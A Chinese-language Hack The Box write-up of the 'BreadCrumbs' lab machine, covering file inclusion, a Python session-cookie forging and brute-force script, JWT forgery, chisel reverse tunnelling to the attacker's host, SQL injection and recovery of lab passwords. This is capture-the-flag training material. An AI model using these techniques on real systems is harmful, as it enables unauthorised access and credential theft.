+++
ShowToc = true
TocOpen = true
title = '0X036 BreadCrumbs'
date = 2024-10-11T14:25:59+08:00
draft = false
private = true
show_reading_time = true
categories = 'HTB'
+++



# 端口扫描

![](/htb_img/WEBRESOURCE70be77fb5ef93b8149102fb00a072d05image.png)

![](/htb_img/WEBRESOURCEe8715c473c00666e0051e4bfffdde548image.png)

![](/htb_img/WEBRESOURCE29b677e2297d8725770835b3ff84dbf4image.png)

![](/htb_img/WEBRESOURCEf06af7d090a1110fa2f7e891703eac51image.png)

# 获取立足点

值得注意的服务：ssh\http\smb\mysql

smb：

![](/htb_img/WEBRESOURCE577cd4ade8a9a13d84ae8618db0b8d31image.png)

http:

看起来是个搜索框，可能是sql注入？

![](/htb_img/WEBRESOURCEc5ccae5df7ad67cbdbab90c92ab5d5c9image.png)

fuzz好像没有：

![](/htb_img/WEBRESOURCEdc4a1d68693754c002aed4f20f59380eimage.png)

目录扫描，发现登录框：

![](/htb_img/WEBRESOURCE88a7af724c1f43258f48b344870d803cimage.png)

发现很多用户名：

![](/htb_img/WEBRESOURCE611c4eb350390e4fbe8373abe6846b4cimage.png)

似乎是存放cookie的地方：

![](/htb_img/WEBRESOURCE79915e476c56fdc93a82e5f7e8c588b7image.png)

同时发现，疑似文件包含：

![](/htb_img/WEBRESOURCEb358716131321cf3f726119aac887f51image.png)

根据报错，看样子是有了：

![](/htb_img/WEBRESOURCE4c50303b32179b578469e85d451c9bffimage.png)

成功读取cookie.php:

![](/htb_img/WEBRESOURCE7bd0675c4fd79d436654812ca19e2971image.png)

查看login.php的源码：

![](/htb_img/WEBRESOURCEe2d9dc38b25f889b59062562bab56330image.png)

似乎authController.php才是负责身份控制的：

![](/htb_img/WEBRESOURCE378001e303caa274ed5fed50c7783e12image.png)

发现数据文件：

![](/htb_img/WEBRESOURCE2903756de18100cc7ab83d37d08408bdimage.png)

发现账号密码：

![](/htb_img/WEBRESOURCE2858bb6f9846a0f08a70ca842e07602dimage.png)

但是不允许登录：

![](/htb_img/WEBRESOURCE75f311313cc9cf369f8e48733673959bimage.png)

看来得代码审计了，目前的用户为cxk1，在登录后台有个我们感兴趣的功能，叫做文件管理：

![](/htb_img/WEBRESOURCE4122ba0229a6bb89cb50f80c35c0c010image.png)

读取它：

简单解读，可以发现，这个页面需要用户名为paul的用户才可以访问：

![](/htb_img/WEBRESOURCE4d23778e62cf8f06a5217cbe1a974503image.png)

返回认证相关功能的代码，我们可以伪造，也就是cookie.php的内容：

这里面只需要提供账号名，我们就可以伪造了：

![](/htb_img/WEBRESOURCE910293850c731e21055e0e151283ddb6image.png)

结合上面的文件管理功能，我们可以伪造paul用户的身份凭证：

![](/htb_img/WEBRESOURCE17b9646a16d87a4a2c5ca7a89b2a938fimage.png)

代码如下：

```
import hashlib
import random

def makesession(username):
    max_index = len(username) - 1
    seed = random.randint(0, max_index)
    key = "s4lTy_stR1nG_" + username[seed] + "(!528./9890"
    session_cookie = username + hashlib.md5(key.encode()).hexdigest()

    return session_cookie

# 测试示例
username = "paul"
session_cookie = makesession(username)
print("Generated Session Cookie:", session_cookie)
```

![](/htb_img/WEBRESOURCE7b9afb35c9b08cf526a1edc1e62bc361image.png)

生成是生成了，但是无法操作成功：

换成别人的成功了：

```
from requests import get
from hashlib import md5

username = "paul"

for i in username:
   key = "s4lTy_stR1nG_" + i + "(!528./9890"
   sessid = username + md5(key.encode()).hexdigest()
   cookie = { "PHPSESSID" : sessid }
   resp = get("http://10.10.10.228/portal/php/files.php", cookies=cookie,
allow_redirects=False)
   if resp.status_code != 302:
      print(f"Valid session ID: {sessid}")

```

替换成功后就成功看到了文件管理功能：

![](/htb_img/WEBRESOURCE359a8464b0c61ba8e6259ce047288941image.png)

但是提示权限不足：

![](/htb_img/WEBRESOURCE6c040c485c6a8ec52c1e26472a8abfb3image.png)

看来是之前就看到了的jwt的问题了，但是jwt的key，我们是可以看到的，就可以伪造：

6cb9c1a2786a483ca5e44571dcc5f3bfa298593a6376ad92185c3258acd5591e

![](/htb_img/WEBRESOURCE4505b48f08482ce5257c0eedd8d3a7e5image.png)

伪造出来为：

eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjp7InVzZXJuYW1lIjoicGF1bCJ9fQ.7pc5S1P76YsrWhi_gu23bzYLYWxqORkr0WtEz_IUtCU

看样子是哪里报错了？

![](/htb_img/WEBRESOURCEac896b1cf79c8284c566c8177d96d3c5image.png)

好像是有拦截：

![](/htb_img/WEBRESOURCE7609f31168f7cf8a6b60ad5ce23ffc51image.png)

![](/htb_img/WEBRESOURCEf5dd9be2220e2ac0b4d5ab7d3541b870image.png)

smbserver好像失败了：

![](/htb_img/WEBRESOURCE4e5840e3c3f693efbf2d81ed2613ce4bimage.png)

那就nishang powershell：

妈的，服了，还有检测，拦截了

![](/htb_img/WEBRESOURCE48110175f2f21ca900e8cce7ce0a791cimage.png)

# 提权

这里的思路，大概如下：

1、登录mysql

2、信息收集

先看第一个把：

这个功能要实现，需要端口转发：

kali执行：

./chisel server -p 6666 --reverse

![](/htb_img/WEBRESOURCE9b85a25eca3841563e2ea4965ca28323image.png)

windows执行：

./chisel.exe client -v 10.10.16.5:6666 R:0.0.0.0:1234:127.0.0.1:1234

![](/htb_img/WEBRESOURCE8a30e52381857804b48c370dc10ce25eimage.png)

这样，windows的3306就映射到了kali的8888端口：

发现密码hash：

![](/htb_img/WEBRESOURCE74860ea6e9c101153538096301935712image.png)

但是爆破不出来：

![](/htb_img/WEBRESOURCE37f3517fb2b12c259a005d66d2a2556aimage.png)

呐只能接着看了：

最后在这里发现密码：

![](/htb_img/WEBRESOURCE187b034fa43eab81c28555bb8262caa1image.png)

通过ssh直接登录：

![](/htb_img/WEBRESOURCEb206d7a490d1e6fd4bc6ec8ec4660c86image.png)

上winpeass:

好像不给运行：

![](/htb_img/WEBRESOURCEdf01a2a1eb828d1c1065c972d5d11994image.png)

其实web是有权限下载和运行的，但是之前看了一眼systeminfo，感觉也没那么容易，继续信息收集把，刚刚的桌面上有一个文件：

![](/htb_img/WEBRESOURCE2da7d9697fb82d9672d663082f38a5d3image.png)

有一些有趣的信息：

未授权？

密码管理？

![](/htb_img/WEBRESOURCEecf6654f884eb7af1fa296030d30e58dimage.png)

Microsoft Store Sticky Notes是便签，他说在进行中，网上进行搜索，发现可以恢复：

[https://blog.csdn.net/sinat_40801052/article/details/123448412](https://blog.csdn.net/sinat_40801052/article/details/123448412)

![](/htb_img/WEBRESOURCEf242f75cc566c25718112a64a681addeimage.png)

![](/htb_img/WEBRESOURCEf3963a476e305c3443ce453012e7cdfcimage.png)

把文件传输到kali:

![](/htb_img/WEBRESOURCEa33e3ed4e66d5a909af55a1fc071a986image.png)

双击打开即可：

development: fN3)sN5Ee@g

![](/htb_img/WEBRESOURCE9330a34bc293fb5d214f9b8fa7580160image.png)

登录成功：

![](/htb_img/WEBRESOURCEe762a9fdca8c9bf53e36d2c0d3f27a41image.png)

发现信息：

![](/htb_img/WEBRESOURCEba449ad73684adfc9b61bdadd98012b1image.png)

好像是个解密的程序：

![](/htb_img/WEBRESOURCEdd3b7cf2d7f0d1f20f72c41fed9ed311image.png)

应该是可以获得administrator的密码：

![](/htb_img/WEBRESOURCE768a802cdf7380308e7c2ce3a974ce2fimage.png)

但是得逆向，通过strings的信息：

Requesting decryption key from cloud...

Account: Administrator

http://passmanager.htb:1234/index.php

method=select&username=administrator&table=passwords

在主机上查看也可以看到1234端口开放

![](/htb_img/WEBRESOURCEd0ee4449599fcba0021079f68cb38c72image.png)

再次转发出来：

![](/htb_img/WEBRESOURCE3b3885fa9a38281a8eb50e2a9b00d8fbimage.png)

使用curl模拟发包：

curl http://passmanager.htb:1234/index.php -d 'method=select&username=administrator&table=passwords'

获得aeskey:k19D193j.<19391(

![](/htb_img/WEBRESOURCEf37794c74d89c31f07bd7a19c21a1048image.png)

那么这里其实很容易想到sql注入，其实也是web页面嘛：

![](/htb_img/WEBRESOURCE284ce5fc23c7757c3583d48be1179b4dimage.png)

查库名：

![](/htb_img/WEBRESOURCE21de18fb1cf3c458fc9ef1315eb24ecfimage.png)

查表名：

![](/htb_img/WEBRESOURCE633a165031ab35661336c286dd9d9cffimage.png)

查列名：

![](/htb_img/WEBRESOURCE7a9cc9cd5447f45e24a1456b01be2314image.png)

查数据：

![](/htb_img/WEBRESOURCE7f169cef0d1f3f7ae4d30c5999c89521image.png)

拿到加密的密码和aes_key了，没有偏移量，在线解密即可：

p@ssw0rd!@#$9890./

![](/htb_img/WEBRESOURCEdd9a6698c340f65bbc98cbe2581a4674image.png)

![](/htb_img/WEBRESOURCE07e2ebf68fc6cc39aac73979fc27b09fimage.png)

# 总结

这台靶机巨烫手，从开始的web渗透开始，到最后的提权。

web渗透的核心是文件包含+代码审计，算是常规考点，但是代码熟悉程度确实是个难点，不是很容易可以写出session的脚本，幸好还有jwt的知识基础，还算容易的绕过。

随后是文件上传，上传需要进行一些修改，否则会被干，以及反弹shell，nishang的脚本也会被干，需要稍微修改一下代码。

中间走了弯路，mysql5的hash加密方式，没有爆出来，随后是信息收集，成功获得第一个合法用户密码。

桌面的工作进程文件，提示存在微软便签，里面存放了明文密码，但是已经被删除，后面通过查询资料，恢复密码，kali可以直接解析，查看即可，获得第二个合法用户密码。

最后是C盘目录下的非常规目录，找到一个Linux程序，通过strings简单的逆向，可以发现一个web服务，但是仅在127.0.0.1地址开放，需要进行端口转发，通过转发出来，发现该服务是给程序来进行aes_key查询的，通过该方式有很明显的查询痕迹，通过sql注入，成功获取到了aes加密的密码，通过aes_key来解密该密码，即可获得administrator的密码。

总体来说，这个靶机考点很多，包括：文件包含、代码审计、端口转发、简单免杀绕过、简单逆向、JWT、SQL注入、AES加密算法，一定的脚本编写能力